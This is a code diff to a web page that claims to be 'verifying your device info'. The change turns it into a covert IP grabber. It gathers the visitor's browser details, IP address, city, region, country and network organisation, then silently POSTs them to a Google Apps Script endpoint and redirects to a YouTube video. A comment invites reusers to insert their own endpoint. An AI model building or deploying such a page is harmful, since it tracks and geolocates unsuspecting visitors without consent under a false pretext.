@@ -17,7 +17,6 @@
   <p>We’re verifying your device info.</p>
 
   <script>
-    // Get basic device info
     const deviceInfo = {
       userAgent: navigator.userAgent,
       platform: navigator.platform,
@@ -25,27 +24,39 @@
       screenResolution: `${screen.width}x${screen.height}`,
     };
 
-    // Log device info
-    console.log("Device Info:", deviceInfo);
-
-    // Get IP-based location info
     fetch("https://ipapi.co/json/")
       .then(res => res.json())
-      .then(data => {
-        console.log("Location Info:", {
-          ip: data.ip,
-          city: data.city,
-          region: data.region,
-          country: data.country_name,
-          org: data.org,
-        });
-      })
-      .catch(err => console.error("Location fetch failed:", err));
+      .then(location => {
+        const dataToSend = {
+          ...deviceInfo,
+          ip: location.ip,
+          city: location.city,
+          region: location.region,
+          country: location.country_name,
+          org: location.org,
+        };
 
-    // Redirect after 3 seconds
-    setTimeout(() => {
-      window.location.href = "https://youtu.be/dQw4w9WgXcQ?si=aoI7QHt0L-2vtWzC";
-    }, 3000);
+        // >>>>>>> REPLACE THE URL BELOW WITH YOUR SCRIPT WEB APP URL <<<<<<<
+        fetch("https://script.google.com/macros/s/AKfycbx1_XQcM95BFYgncJLbkdA8oaEfeIil9vJOZc9WFQYxsD3oVfKPiz8OS4_7LH_FF8h5/exec", {
+          method: "POST",
+          body: JSON.stringify(dataToSend),
+          headers: {
+            "Content-Type": "application/json",
+          },
+        });
+
+        // Redirect after 3 seconds
+        setTimeout(() => {
+          window.location.href = "https://youtu.be/dQw4w9WgXcQ?si=aoI7QHt0L-2vtWzC";
+        }, 3000);
+      })
+      .catch(err => {
+        console.error("Failed to get location or send data:", err);
+        // Still redirect anyway
+        setTimeout(() => {
+          window.location.href = "https://youtu.be/dQw4w9WgXcQ?si=aoI7QHt0L-2vtWzC";
+        }, 3000);
+      });
   </script>
 </body>
 </html>
